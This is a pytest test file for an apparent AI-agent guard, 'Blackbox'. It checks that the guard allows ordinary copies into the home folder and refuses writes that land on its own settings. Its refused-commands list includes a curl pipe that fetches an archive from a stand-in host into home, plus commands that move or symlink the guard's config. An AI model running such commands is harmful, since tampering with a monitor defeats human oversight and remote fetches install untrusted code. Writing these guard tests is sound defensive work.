"""A copy, move, link or unpack is judged by what LANDS, not by the folder it is dropped into.

E2E fix wave 2, 2026-11-21: self-protection refused ``cp notes.md ~`` and ``tar -C ~ -xf a.tar
notes/todo.md`` — the home folder holds Blackbox, and "names a folder that holds a guarded place"
was taken for "writes a guarded place". Ordinary work into the home folder is allowed again; a
write that lands on Blackbox, a move of it, or an unpack whose members cannot be known into a
folder that holds it, is still refused in every mode (``detection/paths/guard_landing.py``).

Nothing is executed: the cases are text handed to the real judgement (``guard.tool_call_verdict``).
"""

from __future__ import annotations

import pytest

from _blackbox_loader import load_blackbox

guard = load_blackbox("guard")
hooks = load_blackbox("guard.hooks")
guard_background = load_blackbox("guard.background")
config_mod = load_blackbox("kernel.config")
ruleset_mod = load_blackbox("ruleset")
shell_files = load_blackbox("detection.paths.shell_files")

OWN_RULE = "blackbox-settings"
CONFIG = "plugins:\n  enabled:\n    - blackbox\n"


@pytest.fixture
def machine(monkeypatch, tmp_path):
    """A home with Hermes + Blackbox (one key file), a project folder ``src`` and a folder ``pkg``
    that holds a ``.hermes`` folder of its own (copying its CONTENTS into ~ would merge into
    Blackbox's). Returns ``use(mode)``."""
    hermes = tmp_path / ".hermes"
    for folder in (hermes / "blackbox", hermes / "plugins" / "blackbox" / "guard"):
        folder.mkdir(parents=True)
    (hermes / "config.yaml").write_text(CONFIG, encoding="utf-8")
    (hermes / "blackbox" / "reporter_key.pem").write_text("not a real key", encoding="utf-8")
    (tmp_path / "src").mkdir()
    (tmp_path / "src" / "a.txt").write_text("a", encoding="utf-8")
    (tmp_path / "pkg" / ".hermes").mkdir(parents=True)
    (tmp_path / "pkg" / "readme").write_text("r", encoding="utf-8")
    monkeypatch.setenv("HOME", str(tmp_path))
    monkeypatch.setenv("HERMES_HOME", str(hermes))
    monkeypatch.delenv("BLACKBOX_HOME", raising=False)
    monkeypatch.delenv("OPENCLAW_CONFIG_PATH", raising=False)
    monkeypatch.setattr(ruleset_mod, "get", lambda cfg=None: ruleset_mod.Ruleset())
    monkeypatch.setattr(guard_background, "_spawn_llm_review", lambda *a, **k: None)

    def use(mode: str) -> None:
        monkeypatch.setattr(hooks, "_config", lambda: config_mod.BlackboxConfig(mode=mode, report=False))
    return use


def _refused(command: str) -> bool:
    verdict = guard.tool_call_verdict("terminal", {"command": command})
    return verdict["decision"] == "block" and any(f["matched"] == OWN_RULE for f in verdict["findings"])


ORDINARY_INTO_HOME = [
    "cp notes.md ~", "cp notes.md ~/", "cp -R ~/src ~", "mv notes.md ~", "rsync -a ./build ~", "ln -s /tmp/x ~",
    "rsync -a ~/src/ ~",                       # src's contents land in ~: a.txt only
    "cp ~/pkg/* ~",                             # the shell's * does not pick .hermes
    "tar -C ~ -xf a.tar notes/todo.md",         # the member it unpacks is named
    "unzip a.zip docs/a.md -d ~",
]

STILL_REFUSED = [
    "cp x ~/.hermes/plugins/blackbox/",         # lands inside Blackbox
    "cp x ~/.hermes/config.yaml",
    "cp config.yaml ~/.hermes",                 # lands AS ~/.hermes/config.yaml
    "mv ~/.hermes/config.yaml /tmp/",           # a move takes Blackbox's settings away
    "ln -s ~/.hermes/config.yaml /tmp/c",       # a second name for them (KI-472)
    "rsync -a ~/pkg/ ~",                        # pkg's .hermes merges into Blackbox's
    "cp -R ~/pkg/. ~",
    "ditto ~/pkg ~",
    "cp $X ~",                                  # what lands is not known
    "tar -C ~ -xf evil.tar",                    # a whole archive into the home folder: members not known
    "curl -s https://x.invalid/a.tgz | tar -xz -C ~",
    "unzip a.zip -d ~",
    "tar -C ~ -xf a.tar .hermes/config.yaml",   # the named member is Blackbox's
]


@pytest.mark.parametrize("command", ORDINARY_INTO_HOME)
def test_ordinary_work_into_the_home_folder_is_allowed(machine, command):
    machine("block")
    assert not _refused(command), command


@pytest.mark.parametrize("mode", ["audit", "block"])
@pytest.mark.parametrize("command", STILL_REFUSED)
def test_a_write_that_lands_on_blackbox_is_refused_in_every_mode(machine, mode, command):
    machine(mode)
    assert _refused(command), command


@pytest.mark.parametrize("command,expected", [
    ("tar -C ~ -xf a.tar notes/todo.md", ["a.tar"]),          # extraction reads only the archive
    ("tar --extract -f in.tar somedir", ["in.tar"]),
    ("tar -C ~ -czf /tmp/o.tgz .hermes", ["/tmp/o.tgz", "~/.hermes"]),   # -C is where operands are read
    ("tar -czf out.tgz --directory=/data logs", ["out.tgz", "/data/logs"]),
])
def test_tar_operands_are_read_where_tar_reads_them(command, expected):
    assert [arg.path for arg in shell_files.shell_file_args(command)] == expected
